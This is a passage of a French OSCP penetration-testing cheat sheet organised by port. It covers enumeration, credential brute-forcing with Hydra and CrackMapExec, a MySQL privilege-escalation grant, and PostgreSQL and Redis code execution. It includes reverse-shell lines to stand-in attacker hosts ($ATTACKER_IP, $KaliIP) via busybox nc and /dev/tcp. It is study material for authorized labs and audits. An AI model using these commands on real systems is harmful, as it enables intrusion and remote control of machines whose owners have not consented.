# Énumérer les utilisateurs de la base de données
SELECT user FROM mysql.user;

# Privilege Escalation
GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

```

```powershell
# 1. Copier un fichier déjà existant depuis Windows vers un autre emplacement.
SELECT LOAD_FILE('C:\\xampp\htdocs\\ncat.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';

# 2. Vérifiez les autorisations du nouveau fichier écrit.
icacls 'C:\\xampp\htdocs\nc.exe'

# Une sortie comme celle ci-dessous indique que le fichier a été écrit avec des privilèges d'administration, donc l'utilisateur DB a un privilège d'administration (considérez WerTrigger exploiter pour excalation).
nc.exe WinServer\\apache:(I)(F)  
    NT AUTHORITY\\SYSTEM:(I)(F)  
    BUILTIN\\Administrators:(I)(F)  
    BUILTIN\\Users:(I)(RX)  
Successfully processed 1 files; Failed processing 0 files

```

### 3389: RDP

<p class="oscp-command-note">Nmap (RDP) : lancer les scripts NSE « rdp-enum-encryption, rdp-vuln-ms12-020, rdp-ntlm-info ».</p>

```bash
nmap -sV -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <IP_CIBLE>

```

<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur RDP à partir d'un dictionnaire.</p>

```bash
hydra -L <user_list> -P <password_list> -s 3389 rdp://<IP>

```

<p class="oscp-command-note">RDP : tester les identifiants de laboratoire avec Crowbar ou CrackMapExec.</p>

```bash
# Utilisation de Crowbar
crowbar -b rdp -s <target_ip>/32 -U users.txt -C rockyou.txt

# Utilisation de CrackMapExec
crackmapexec rdp <target_ip> -u users.txt -p rockyou.txt

```

<p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>

```bash
# Se connecter au bureau distant avec FreeRDP (vérifier la version installée)
xfreerdp /cert-ignore /bpp:8 /compression /themes /wallpaper /auto-reconnect /h:1000 /w:1600 /v:<IP> /u:<username> /p:<password>

# Connectez-vous à un mapping de lecteur et à un timeout accru
xfreerdp /u:<username> /v:<IP> /cert:ignore /p:<password> /timeout:20000 /drive:<drive_name>,<local_path>

# Connectez-vous avec le support du presse-papiers et la résolution de réglage
xfreerdp /compression +auto-reconnect /u:$USER/p:$PASSWORD /v:<ip> +clipboard /size:1920x1080 /drive:desktop,/home/$YOUR_USERNAME/Desktop

# Connectez-vous en utilisant rdesktop avec des identifiants
rdesktop -u $USER -p $PASSWORD -g 1920x1080 <ip>

# Connexion en utilisant rdesktop sans identifiants
rdesktop <ip>

```

#### Vérification d'un compte RDP

Tester un compte de laboratoire sur le service RDP si les règles d'audit autorisent l'authentification.

<p class="oscp-command-note">Vérification d'un compte RDP.</p>

```bash
nxc rdp <IP_CIBLE> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>'
```

### 5432, 5433: PostgreSQL

Examiner les connexions, la configuration et les requêtes de la base de données.

<p class="oscp-command-note">Nmap (POSTGRESQL) : lancer les scripts NSE « postgresql-info, postgresql-user-enum, postgresql-ssl ».</p>

```bash
nmap -sV -p 5432,5433 --script pgsql-brute <IP_CIBLE>

```

<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur POSTGRESQL à partir d'un dictionnaire.</p>

```bash
hydra -L users.txt -P passwords.txt -s 5432 <ip> postgresql

```

<p class="oscp-command-note">PostgreSQL : se connecter avec psql et afficher les bases accessibles.</p>

```bash
psql -h <IP_CIBLE> -U <UTILISATEUR> -d postgres -c '\l'

```

```bash
# -W: Demander un mot de passe
psql -h <IP_CIBLE> -p 5432 -U <UTILISATEUR> -W

```

<p class="oscp-command-note">Exécuter 50847.py avec les paramètres indiqués pour «PostgreSQL».</p>

```bash
# Versions mentionnées comme potentiellement affectées par une RCE : vérifier la version exacte et les correctifs.

# Exécutez le script d'exploitation pour obtenir l'exécution de code à distance
python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"

```

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «PostgreSQL».</p>

```bash
#POC  
DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec(cmd_output text);  
COPY cmd_exec FROM PROGRAM 'id';  
SELECT * FROM cmd_exec;  
DROP TABLE IF EXISTS cmd_exec;

#Reverse Shell
DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'sh -i >& /dev/tcp/$KaliIP/8080 0>&1';
SELECT * FROM cmd_exec;  
DROP TABLE IF EXISTS cmd_exec;

```

<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>

```sql
# Liste toutes les bases de données
\l

# Se connecter à une base de données précise
\c <DB_NAME>

# Lister les tables de la base de données courante
\dt

# Afficher la structure d'une table
\d <TABLE_NAME>

# Interroger le contenu d'une table spécifique
SELECT * FROM <TABLE_NAME>;

# Obtenez des informations détaillées sur un tableau, y compris les colonnes et leurs types
\d+ <TABLE_NAME>

# Exécuter une requête pour trouver des données spécifiques, comme des utilisateurs avec un attribut particulier
SELECT * FROM users WHERE attribute = 'value';

# Exemple de commande pour lister toutes les tables et leurs colonnes
SELECT table_name, column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'public';

# Exécuter une commande SQL pour créer une nouvelle table
CREATE TABLE test_table (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

# Insérer des données dans une table de test
INSERT INTO test_table (name) VALUES ('example_data');

# Modifier les données d’une table
UPDATE test_table SET name = 'updated_data' WHERE id = 1;

# Supprimer des données d’une table
DELETE FROM test_table WHERE id = 1;

```

### 5900: VNC (Virtual Network Computing)

<p class="oscp-command-note">Nmap (VNC) : lancer les scripts NSE « vnc-info, vnc-auth-bypass ».</p>

```bash
nmap -sV -p 5900 --script vnc-info <IP_CIBLE>

```

<p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>

```bash
# Utilisez vncviewer ou tigrevnc pour vous connecter à un serveur VNC
vncviewer <IP_CIBLE>::5900

# Connexion plus détaillée avec l'authentification
vncviewer -passwd /chemin/vers/fichier_mot_de_passe <IP_CIBLE>::5900

```

<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur VNC à partir d'un dictionnaire.</p>

```bash
hydra -L <user_list> -P <password_list> vnc://<ip>

```

<p class="oscp-command-note">Exemple de résultat d'un service VNC</p>

```text
No Password
vnc
1234

```

```text
1. Explore the filesystem
2. Run commands
3. Capture screenshots with scrot
4. Manipulate files

```

### 5985, 5986: WinRM

Observer les permissions et la configuration de Windows.

<p class="oscp-command-note">Nmap (WINRM) : lancer les scripts NSE « winrm-info ».</p>

```bash
nmap -sV -p 5985,5986 <IP_CIBLE>

```

<p class="oscp-command-note">Tester les identifiants fournis sur le service WINRM avec CrackMapExec.</p>

```bash
crackmapexec winrm <IP> -u <USER> -p <PASSWORD>

```

```powershell
# Utilisation de PowerShell pour se connecter à WinRM
Enter-PSSession -ComputerName <IP_CIBLE> -Credential (Get-Credential)

```

<p class="oscp-command-note">Ouvrir une session distante WinRM.</p>

```bash
# utilisant Kali pour se connecter à WinRM
evil-winrm -i <ip> -u <USER> -p <PASSWORD>

```

#### Informations WinRM

Identifier si le point de terminaison WinRM est accessible en HTTP et s'il demande une authentification.

<p class="oscp-command-note">Informations WinRM.</p>

```bash
curl -i --max-time 5 http://<IP_CIBLE>:5985/wsman
```

#### Authentification WinRM autorisée

Tester des identifiants fournis pour l'audit sur une seule cible, sans mot de passe en masse.

<p class="oscp-command-note">Authentification WinRM autorisée.</p>

```bash
nxc winrm <IP_CIBLE> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>' -d '<DOMAINE>'
```

### 6379: Redis

<p class="oscp-command-note">Nmap (REDIS) : lancer les scripts NSE « redis-info, redis-rce ».</p>

```bash
nmap -sV -p 6379 --script redis-info <IP_CIBLE>

```

<p class="oscp-command-note">Interroger un serveur Redis.</p>

```bash
redis-cli -h <IP_CIBLE> -p 6379 --askpass

```

<p class="oscp-command-note">Rechercher des références de vulnérabilités connues.</p>

```bash
# Recherche de vulnérabilités et de techniques d'exploitation connues de Redis
searchsploit redis

# Exécutez un serveur Redis rogue pour capturer des données ou exécuter des commandes
python3 redis-rogue-server.py -p 6379

# Exécutez l'exploitation de Redis RCE à l'aide d'un script personnalisé (remplacez la charge utile souhaitée)
python3 redis-rce-exploit.py -h <ip> -p 6379 -c "payload"

```

<p class="oscp-command-note">Interroger un serveur Redis.</p>

```bash
# Se connecter au serveur Redis
redis-cli -h <IP_CIBLE> -p 6379

# Après connexion, afficher les informations et les clés de la base sélectionnée
info
keys *
select 0  # Sélectionner la base 0 (par défaut)

# Exemple de lecture et écriture de clés dans un laboratoire
set mykey myvalue
get mykey

config get '*'  # Afficher les paramètres de configuration accessibles
# Ne pas lancer SHUTDOWN : cette commande arrête le serveur Redis.

```

### Port inconnu

Vérifier les ports et les services de la cible autorisée.

<p class="oscp-command-note">Netcat/Telnet : établir la connexion TCP au service «Port inconnu».</p>

```bash
# Connectez-vous au port inconnu pour identifier le service
nc -nv <IP_CIBLE> <PORT_TCP>

```

```bash
# Toujours lister les commandes ou options disponibles pour recueillir plus d'informations sur le service
help

```

<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>

```bash
# Tentative de connexion avec des identifiants connus ou devinés
# Vous devrez peut-être remplacer <USERNAME> et <PASSWORD> par des valeurs appropriées.
printf '%s\n%s\n' "$UTILISATEUR" "$MOT_DE_PASSE" | nc -nv "$IP_CIBLE" "$PORT_TCP"

# Si le service fournit des options de commande ou aide à la sortie, utilisez-les pour guider d'autres actions
# Par exemple, si le service a des commandes comme 'list', 'status' ou 'config', utilisez ces
printf 'list\n' | nc -nv "$IP_CIBLE" "$PORT_TCP"

```

<p class="oscp-command-note">Exemple ou valeur de référence pour «Port inconnu» : vérifier le contexte avant usage.</p>

```bash
# Après avoir identifié le service, référez-vous à sa documentation ou à sa commande par défaut
# Par exemple, si le service est un outil de gestion, les commandes peuvent inclure la liste des utilisateurs ou des configurations de requête

# Exemple de commandes peut inclure :
# - Listing users or available configurations
# - Exécuter des commandes administratives le cas échéant
# - Collecte d'informations sur l'état ou la configuration du service

# Remplacer par des commandes appropriées basées sur le service identifié et la sortie d'aide

```

#### Détecter si un port parle TLS

Observer la négociation TLS d'un service inconnu avant de choisir l'outil d'énumération.

<p class="oscp-command-note">Détecter si un port parle TLS.</p>

```bash
openssl s_client -connect <IP_CIBLE>:<PORT> -brief
```

## Vérifications ciblées des services

Ces vérifications complètent l'inventaire des ports. Elles s'utilisent uniquement sur les hôtes inclus dans le périmètre d'audit. Un résultat de scan est un indice : confirmer manuellement la configuration avant de conclure.

### Nmap : examiner précisément un service

Afficher la documentation d'un script NSE, puis interroger uniquement SMB sur le port 445.

<p class="oscp-command-note">Nmap : examiner précisément un service.</p>

```bash
nmap --script-help smb-ls
nmap -sV -p 445 --script smb-ls <IP_CIBLE>
```

### Découverte via un proxy TCP

Utiliser un scan TCP connect lorsque l'accès réseau passe par un proxy SOCKS. Les scans SYN ou UDP ne se comportent pas comme un scan TCP connect derrière proxychains.

<p class="oscp-command-note">Découverte via un proxy TCP.</p>

```bash
proxychains4 -q nmap -sT -Pn --top-ports 200 <IP_CIBLE>
```

### NFS : identifier les exports

Consulter la liste des partages publiés par un service NFS, avant toute tentative de montage.

<p class="oscp-command-note">NFS : identifier les exports.</p>

```bash
showmount -e <IP_CIBLE>
```

### RPC : examiner les utilisateurs visibles

Tester l'accès RPC sans identifiants ; un refus d'accès est un résultat normal et ne prouve pas une anomalie.

<p class="oscp-command-note">RPC : examiner les utilisateurs visibles.</p>

```bash
rpcclient -U '' -N <IP_CIBLE> -c 'enumdomusers'
```

### SNMP : interroger les informations système

Essayer une communauté fournie pour l'audit. SNMPv1/v2c ne chiffre pas ces requêtes.

<p class="oscp-command-note">SNMP : interroger les informations système.</p>

```bash
snmpwalk -v2c -c <COMMUNAUTE> <IP_CIBLE> 1.3.6.1.2.1.1
```

### Redis : rechercher les informations du service

Interroger le port Redis avec un script NSE ciblé, puis confirmer la version et la configuration observées.

<p class="oscp-command-note">Redis : rechercher les informations du service.</p>

```bash
nmap -sV -p 6379 --script redis-info <IP_CIBLE>
```

**Référence technique complémentaire :** [Notes OSCP de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/10_info_gathering.md). Cette synthèse conserve la structure de SKILL-ISSUE et reformule les explications.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

## Syntaxes complémentaires de la source

Exemples présents hors des rubriques principales de la page d'origine.

**Paramètres et repères :**
`-m`  

<!-- refined-oscp -->
